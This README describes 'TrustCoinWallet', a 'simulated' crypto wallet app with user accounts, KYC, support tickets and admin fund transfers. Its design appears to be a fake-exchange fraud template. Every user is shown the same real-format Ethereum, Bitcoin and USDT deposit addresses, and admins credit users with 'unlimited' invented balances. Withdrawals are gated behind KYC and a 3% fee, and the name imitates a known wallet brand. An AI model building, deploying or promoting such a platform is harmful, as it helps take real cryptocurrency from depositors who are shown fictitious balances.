# TrustCoinWallet - Full-Stack Cryptocurrency Wallet Application

A comprehensive simulated cryptocurrency wallet platform with user accounts, admin management, KYC verification, support tickets, and fund transfers.

## Features

### User Features
- User registration and authentication with JWT
- **Standardized wallet addresses for all users:**
  - Ethereum: `0x505917f33e13642996068cdb135754c9d96811b9`
  - Bitcoin: `bc1q3sckm34082natadrqxqdguev32707pcal5ea53`
  - USDT TRC20: `0x505917f33e13642996068cdb135754c9d96811b9`
- Wallet overview with balance display
- Transaction history
- Simulated fund withdrawals with gas fees
- KYC verification process
- External wallet connection support
- Personal settings and theme preference (dark/light mode)
- Support ticket submission and management
- Real-time notifications

### Admin Features
- User management dashboard
- **Fund transfer system with unlimited balance**
- Admin-only fund transfer UI with format validation
- Support ticket management and responses
- KYC review and approval/rejection panel
- Dashboard statistics
- Real-time notification system for admins
- Transfer history tracking

### Technical Features
- Dark/Light theme toggle
- Real-time notifications via Socket.IO
- Wallet address validation (format checking)
- Gas fee simulation (3% per transaction)
- KYC verification workflow
- Support ticket tracking system
- Admin unlimited funds for transfers
- Responsive API design

## Wallet Addresses (All Users)

Every user has the same standardized wallet addresses:

- **Ethereum**: `0x505917f33e13642996068cdb135754c9d96811b9`
- **Bitcoin**: `bc1q3sckm34082natadrqxqdguev32707pcal5ea53`
- **USDT TRC20**: `0x505917f33e13642996068cdb135754c9d96811b9`

## Project Structure

```
trustwallet/
├── server/
│   ├── models/
│   │   ├── User.js
│   │   ├── Transaction.js
│   │   ├���─ SupportTicket.js
│   │   └── AdminFundTransfer.js
│   ├── routes/
│   │   ├── auth.js
│   │   ├── wallet.js
│   │   ├── transactions.js
│   │   ├── admin.js
│   │   ├── support.js
│   │   └── kyc.js
│   ├── middleware/
│   │   └── auth.js
│   └── index.js
├── package.json
└── .env.example
```

## Installation

### Backend Setup

1. Clone the repository
2. Install dependencies: `npm install`
3. Create `.env` file from `.env.example`
4. Configure MongoDB connection
5. Start server: `npm run server:dev`

## API Endpoints

### Authentication
- `POST /api/auth/register` - Register new user
- `POST /api/auth/login` - Login user
- `GET /api/auth/me` - Get current user
- `PUT /api/auth/theme` - Update theme preference

### Wallet
- `GET /api/wallet/overview` - Get wallet overview with all addresses
- `POST /api/wallet/connect-external` - Connect external wallet
- `GET /api/wallet/external-wallets` - Get connected wallets

### Transactions
- `GET /api/transactions/history` - Get transaction history
- `POST /api/transactions/simulate-withdrawal` - Simulate withdrawal with fees
- `POST /api/transactions/withdraw` - Process withdrawal (KYC required)

### Admin (Admin Only)
- `GET /api/admin/verify` - Verify admin access
- `GET /api/admin/users` - Get all users
- `GET /api/admin/users/search/:query` - Search users by ID, email, or username
- `POST /api/admin/transfer-funds` - **Transfer funds to user wallet**
  - Required fields: `userId`, `userWalletAddress`, `cryptocurrency`, `amount`
  - Admin funds: Unlimited
  - Wallet address format validation included
- `GET /api/admin/fund-transfers` - Get fund transfer history
- `GET /api/admin/dashboard-stats` - Get dashboard statistics

### Support
- `POST /api/support/create-ticket` - Create support ticket
- `GET /api/support/my-tickets` - Get user's tickets
- `GET /api/support/ticket/:ticketId` - Get ticket details
- `POST /api/support/ticket/:ticketId/message` - Add message to ticket
- `GET /api/support/all-tickets` - Get all tickets (admin)
- `PATCH /api/support/ticket/:ticketId/status` - Update ticket status (admin)

### KYC
- `POST /api/kyc/submit` - Submit KYC verification
- `GET /api/kyc/status` - Get KYC status
- `GET /api/kyc/pending` - Get pending KYC submissions (admin)
- `POST /api/kyc/approve/:userId` - Approve KYC (admin)
- `POST /api/kyc/reject/:userId` - Reject KYC (admin)

## Admin Fund Transfer API

### Endpoint: POST /api/admin/transfer-funds

**Headers:**
```
Authorization: Bearer <admin_token>
Content-Type: application/json
```

**Request Body:**
```json
{
  "userId": "user_object_id",
  "userWalletAddress": "0x505917f33e13642996068cdb135754c9d96811b9",
  "cryptocurrency": "ethereum",
  "amount": 10.5
}
```

**Response:**
```json
{
  "message": "Funds transferred successfully",
  "fundTransfer": {
    "id": "transfer_id",
    "userId": "user_id",
    "userWalletAddress": "0x505917f33e13642996068cdb135754c9d96811b9",
    "cryptocurrency": "ethereum",
    "amount": 10.5,
    "status": "completed",
    "timestamp": "2024-01-01T00:00:00Z"
  }
}
```

## License

MIT
